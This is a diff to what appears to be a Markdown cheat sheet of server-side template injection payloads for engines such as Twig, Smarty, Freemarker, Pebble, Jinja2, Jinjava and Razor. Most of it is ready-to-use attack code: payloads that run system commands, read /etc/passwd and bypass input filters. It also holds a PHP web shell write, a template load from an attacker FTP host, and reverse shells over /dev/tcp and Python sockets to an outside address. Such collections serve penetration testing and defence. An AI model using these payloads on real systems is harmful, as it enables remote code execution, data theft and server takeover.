@@ -7,7 +7,7 @@
 * [Tools](#tools)
 * [Methodology](#methodology)
 * [Ruby](#ruby)
-  * [Basic injection](#basic-injection)
+  * [Basic injections](#basic-injections)
   * [Retrieve /etc/passwd](#retrieve--etc-passwd)
   * [List files and directories](#list-files-and-directories)
 * [Java](#java)
@@ -17,9 +17,13 @@
 * [Twig](#twig)
   * [Basic injection](#basic-injection)
   * [Template format](#template-format)
+  * [Arbitrary File Reading](#arbitrary-file-reading)
   * [Code execution](#code-execution)
 * [Smarty](#smarty)
 * [Freemarker](#freemarker)
+  * [Basic injection](#basic-injection)
+  * [Code execution](#code-execution)
+* [Peeble](#peeble)
   * [Basic injection](#basic-injection)
   * [Code execution](#code-execution)
 * [Jade / Codepen](#jade---codepen)
@@ -37,6 +41,10 @@
 * [Jinjava](#jinjava)
   * [Basic injection](#basic-injection)
   * [Command execution](#command-execution)
+* [ASP.NET Razor](#aspnet-razor)
+  * [Basic injection](#basic-injection)
+  * [Command execution](#command-execution)
+* [References](#references)
 
 ## Tools
 
@@ -55,10 +63,18 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ## Ruby
 
-### Basic injection
+### Basic injections
+
+ERB:
 
 ```ruby
 <%= 7 * 7 %>
+```
+
+Slim:
+
+```ruby
+#{ 7 * 7 }
 ```
 
 ### Retrieve /etc/passwd
@@ -71,6 +87,14 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ```ruby
 <%= Dir.entries('/') %>
+```
+
+### Code execution
+
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
 ```
 
 ## Java
@@ -106,6 +130,8 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ```python
 {{7*7}}
 {{7*'7'}} would result in 49
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
 ```
 
 ### Template format
@@ -122,17 +148,34 @@ $output = $twig > render (
 );
 ```
 
+### Arbitrary File Reading
+
+```python
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+```
+
 ### Code execution
 
 ```python
 {{self}}
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+```
+
+Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+
+```powershell
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 ```
 
 ## Smarty
 
 ```python
+{$smarty.version}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
@@ -150,6 +193,32 @@ The template can be `${3*3}` or the legacy `#{3*3}`
 ```js
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+## Pebble
+
+### Basic injection
+
+```java
+{{ someString.toUPPERCASE() }}
+```
+
+### Code execution
+
+```java
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
 ```
 
 ## Jade / Codepen
@@ -187,9 +256,9 @@ ${x}
 ## Jinja2
 
 [Official website](http://jinja.pocoo.org/)
-> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
+> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
-### Basic injection
+### Basic injection
 
 ```python
 {{4*4}}[[5*5]]
@@ -253,13 +322,40 @@ Listen for connexion
 nv -lnvp 8000
 ```
 
-Inject this template
+#### Exploit the SSTI by calling subprocess.Popen.
+:warning: the number 396 will vary depending of the application.
 
 ```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
-{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
-{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
+
+#### Exploit the SSTI by calling Popen without guessing the offset
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
+In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+```
+
+#### Exploit the SSTI by writing an evil config file.
+
+```python
+# evil config
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+```
+
 
 ### Filter bypass
 
@@ -294,6 +390,11 @@ Bypassing `|join`
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+```python
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
 ## Jinjava
 
 ### Basic injection
@@ -320,6 +421,21 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
 
+## ASP.NET Razor
+
+### Basic injection
+
+```powershell
+@(1+2)
+```
+
+### Command execution 
+
+```csharp
+@{
+  // C# code
+}
+```
 
 ## References
 
@@ -335,3 +451,5 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
 * [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
 * [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
+* [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+* [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
